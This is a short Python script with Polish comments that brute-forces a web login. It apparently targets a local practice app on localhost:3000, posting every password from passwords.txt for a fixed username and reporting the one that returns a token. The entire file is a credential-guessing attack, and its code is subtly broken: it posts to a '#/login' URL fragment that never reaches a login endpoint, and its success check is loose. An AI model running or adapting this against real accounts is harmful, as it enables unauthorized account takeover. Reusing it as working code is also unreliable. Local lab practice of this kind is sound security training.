import requests  # Import biblioteki do zadan HTTP

# Adres URL do logowania
url = "http://localhost:3000/#/login"

# Login do przetestowania
username = "pawel@pawel.pl"

# Wczytanie listy hasel
with open("passwords.txt", 'r') as f:
    content = f.read()
    content1 = content.split("\n")

# Proba logowania dla kazdego hasla
for password in content1:
    data = {"username": username, "password": password}
    #wyslanie zapytania POST do serwera z danymi logowania
    response = requests.post(url, data=data)
    
    #sprawdzenie czy logowanie sie powiodlo
    if response.status_code == 200 and ("token" in response.text or "success" in response.text):
        print(f"Sukces! Haslo znalezione: {password}")
        break
    else:
        print(f"Testowanie: {password}")